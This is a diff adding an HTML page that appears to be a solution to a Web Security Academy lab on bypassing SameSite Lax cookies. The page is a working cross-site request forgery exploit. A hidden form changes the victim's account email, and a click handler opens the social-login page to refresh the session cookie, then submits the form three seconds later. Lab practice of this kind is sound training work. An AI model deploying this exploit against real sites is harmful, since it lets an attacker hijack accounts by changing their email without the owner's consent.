@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Exploit SameSite Lax bypass via cookie refresh</title>
+
+	<style type="text/css">
+	body {
+		margin:40px auto;
+		max-width:650px;
+		line-height:1.6;
+		font-size:18px;
+		color:#ddd;
+/*		color:#444;*/
+		padding:0 10px;
+		background: #333;
+/*		background: #eee;*/
+	}
+
+	h1,h2,h3 {
+		line-height:1.2}
+	}
+
+	</style>
+</head>
+<body>
+
+<h1>Hello hacker</h1>
+
+<p>This is not another <b>motherfucking website</b>.</p>
+
+<div style="margin-left: 18%;">
+	<form action="https://0af0002503e3e621830591ad00450050.web-security-academy.net/my-account/change-email" method="POST">
+		<input type="email" name="email" value="hackerman@3l1te.net" hidden=true>
+		<input type="submit" value="Click Me !">
+	</form>
+</div>
+
+<script type="text/javascript">
+	console.log("Hello");
+
+	window.onclick = function(){
+		// Refresh the session cookie !
+		window.open('https://0af0002503e3e621830591ad00450050.web-security-academy.net/social-login');
+
+		// submit the form, for the CSRF attack
+		// wait 3s for the redirection
+		setTimeout( function() {
+			console.log("Attack !");
+			document.forms[0].submit();
+		}, 3000);
+	}
+
+</script>
+
+</body>
+</html>
